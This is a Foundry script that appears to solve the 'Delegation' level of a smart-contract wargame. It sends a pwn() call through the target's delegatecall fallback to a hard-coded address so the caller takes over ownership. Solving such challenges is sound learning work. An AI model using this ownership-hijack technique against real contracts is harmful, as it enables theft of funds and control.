// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "../src/level6/Delegation.sol";
import "forge-std/console.sol";

contract level6Exploit is Script {
    Delegation delegation =
        Delegation(0x314696c213a416b5687509583F3aAc44fcFd0660);

    function run() external {
        vm.startBroadcast();

        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner: ", delegation.owner());
        vm.stopBroadcast();
    }
}
